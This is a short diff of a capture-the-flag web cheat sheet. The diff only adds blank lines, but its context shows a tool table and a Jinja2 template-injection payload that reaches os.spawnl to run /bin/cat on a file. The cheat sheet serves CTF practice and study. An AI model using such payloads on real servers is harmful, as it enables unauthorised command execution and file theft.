@@ -6,6 +6,7 @@ category: "Tools/CTF"
 ---
 
 # Web Cheat Sheet
+
 ## Online Tools
 | Fuck                             | Beautifier                       |
 | -------------------------------- | -------------------------------- |
@@ -35,6 +36,7 @@ category: "Tools/CTF"
     {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
     ```
 {% endraw %}
+
 ## Others
 * wasm $\to$ c: [wabt](https://github.com/WebAssembly/wabt)
     ```bash!
